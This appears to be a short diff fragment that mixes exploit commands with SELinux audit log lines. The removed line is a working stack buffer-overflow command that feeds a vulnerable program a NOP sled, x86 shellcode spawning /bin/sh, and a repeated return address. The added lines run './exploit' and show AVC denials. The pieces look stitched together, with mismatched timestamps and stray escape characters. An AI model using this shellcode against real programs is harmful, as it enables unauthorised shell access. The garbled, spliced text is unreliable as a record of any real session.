@@ -1,2 +1,3 @@
-nomie apathy # ./buffer $(python -c 'print "\x90"*150 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x6e\x2f\x73\x68\x66\x68\x62\x69\x83\xec\x01\xc6\x04\x24\x2f\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + 35*"\x25\xf3\xff\xbf"')
-[   55.224877] type=1400 audit(1304425015.053:3): avc:  denied  { execute } for  pid=720 comm="test" scontext=system_u:system_r:test2_t:s0 tcontext=system_u:system_r:unconfined_t:s0 tclass=process
+$ ./exploit
+[ 3179.240426] type=AVC msg=audit(1242575005.122:101): avc: denied { getattr } for pid=2508 comm="/usr/bin/app" scontext=system_u:system_r:test1\_worker\_t:s0 tcontext=system_u:system_r:test1_conf_t:s0 tclass=file
+[ 3179.240683] type=AVC msg=audit(1242575005.122:101): avc: denied { read } for pid=2508 comm="/usr/bin/app" scontext=system_u:system_r:test1\_worker\_t:s0 tcontext=system_u:system_r:test1_conf_t:s0 tclass=file
